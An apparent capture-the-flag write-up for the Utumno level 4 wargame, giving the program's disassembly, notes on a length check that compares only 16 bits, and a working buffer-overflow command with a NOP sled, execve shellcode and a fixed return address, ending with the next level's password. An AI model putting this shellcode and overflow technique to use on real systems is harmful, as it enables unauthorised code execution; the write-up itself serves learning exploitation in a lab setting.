Dump of assembler code for function main:
```assembly
   0x0804844b <+0>:	push   ebp
   0x0804844c <+1>:	mov    ebp,esp
   0x0804844e <+3>:	sub    esp,0xff04
   0x08048454 <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048457 <+12>:	add    eax,0x4
   0x0804845a <+15>:	mov    eax,DWORD PTR [eax]
   0x0804845c <+17>:	push   eax
   0x0804845d <+18>:	call   0x8048330 <atoi@plt>
   0x08048462 <+23>:	add    esp,0x4
   0x08048465 <+26>:	mov    DWORD PTR [ebp-0x4],eax
   0x08048468 <+29>:	mov    eax,DWORD PTR [ebp-0x4]
   0x0804846b <+32>:	mov    WORD PTR [ebp-0x6],ax
   0x0804846f <+36>:	cmp    WORD PTR [ebp-0x6],0x3f		#we compare only the lower half of memory
   0x08048474 <+41>:	jbe    0x804847d <main+50>		#unsigned compare, cant use int overflow here
   0x08048476 <+43>:	push   0x1
   0x08048478 <+45>:	call   0x8048310 <exit@plt>
   0x0804847d <+50>:	mov    edx,DWORD PTR [ebp-0x4]
   0x08048480 <+53>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048483 <+56>:	add    eax,0x8
   0x08048486 <+59>:	mov    eax,DWORD PTR [eax]
   0x08048488 <+61>:	push   edx
   0x08048489 <+62>:	push   eax
   0x0804848a <+63>:	lea    eax,[ebp-0xff02]
   0x08048490 <+69>:	push   eax
   0x08048491 <+70>:	call   0x8048300 <memcpy@plt>
   0x08048496 <+75>:	add    esp,0xc
   0x08048499 <+78>:	mov    eax,0x0
   0x0804849e <+83>:	leave  
   0x0804849f <+84>:	ret
```
note:
0x0804846f <+36>:	cmp    WORD PTR [ebp-0x6],0x3f
we compare only the lower half of memory!
this can be used, for instance, if we put eax = 0xffffffff --> we compare 0xffff to 0x3f
but we can exploit this: use eax = 0xffff0000 --> we compare 0x0000 to 0x3f
(this mistake is done because comparing unsigned short int and unsigned int, so casting is performed by cutting the int in the middle)

lets use eax = 0x0001000 = 65536

stack overflow!
return address: 0xfffed998

21+50 = 71 --> 65286 - 121 = 65215

/utumno/utumno4 65536 $(python -c 'print "\x90"*65215+"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"\x90"*50+"\x98\xd9\xfe\xff"+"\x90"*50')

we get:
woucaejiek


